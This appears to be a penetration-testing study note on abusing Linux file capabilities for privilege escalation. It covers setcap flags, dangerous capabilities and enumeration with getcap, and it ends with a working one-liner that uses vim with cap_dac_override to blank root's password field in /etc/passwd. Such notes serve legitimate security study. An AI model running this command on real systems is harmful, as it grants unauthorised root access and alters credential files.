
Linux capabilities allow specific privileges to be granted to processes/binaries individually, rather than the traditional all-or-nothing Unix user/group privilege model. More granular = more secure in theory, but misconfigured or excessive capabilities are a common privesc vector.

## Core Concept
- Capabilities split up "root power" into discrete units (e.g. binding to low ports, overriding file permissions, admin actions).
- A binary with a capability set can perform that specific privileged action **without** running via `sudo` or being SUID root.
- **Risk:** if capabilities are misused, overused, or granted to poorly isolated processes, they can be abused to escalate privileges.

## Setting Capabilities
Uses the `setcap` command:
```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

### Capability Value Flags
| Value | Meaning |
|---|---|
| `=` | Sets capability but grants no privileges (used to clear) |
| `+ep` | Grants **e**ffective + **p**ermitted privileges — can perform the action, not inheritable |
| `+ei` | Grants **e**ffective + **i**nheritable — child processes inherit the capability |
| `+p` | Grants only **p**ermitted — usable but not inheritable by children |

## Dangerous Capabilities (Reference)

| Capability | Description |
|---|---|
| `cap_sys_admin` | Broad admin privileges — modify system files/settings, mount/unmount filesystems |
| `cap_sys_chroot` | Change root directory for the process — access otherwise-inaccessible files |
| `cap_sys_ptrace` | Attach to/debug other processes — potential info leak or behavior modification |
| `cap_sys_nice` | Raise/lower process priority — resource access abuse |
| `cap_sys_time` | Modify system clock — timestamp manipulation |
| `cap_sys_resource` | Modify resource limits (open FDs, memory allocation, etc.) |
| `cap_sys_module` | Load/unload kernel modules — modify OS behavior |
| `cap_net_bind_service` | Bind to privileged network ports |

### Capabilities That Directly Enable Root PrivEsc
| Capability | Description |
|---|---|
| `cap_setuid` | Set effective UID — impersonate another user, including root |
| `cap_setgid` | Set effective GID — impersonate another group, including root |
| `cap_sys_admin` | Wide admin privileges, effectively root-equivalent actions |
| `cap_dac_override` | Bypass file read/write/execute permission checks entirely |

---

## Enumerating Capabilities
Search common binary directories and check capabilities on each:
```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Example output:
```
/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

Check a specific binary:
```bash
getcap /usr/bin/vim.basic
```

---

## Exploitation Example — `cap_dac_override` on vim

`cap_dac_override` lets the binary bypass file permission checks — meaning a non-privileged user can use it to edit files they normally couldn't (like `/etc/passwd`), even without `sudo`.

**Interactive method:**
```bash
/usr/bin/vim.basic /etc/passwd
```

**Non-interactive (scripted) method** — strips the password hash placeholder (`x`) from root's entry:
```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

**Result:**
```
root::0:0:root:/root:/bin/bash
```

With the `x` removed, root has no password set in `/etc/passwd` — `su` can now be used to log in as root with **no password prompt**.

> ⚠️ This directly modifies `/etc/passwd` — destructive on a real target; understand blast radius before running on production/live systems.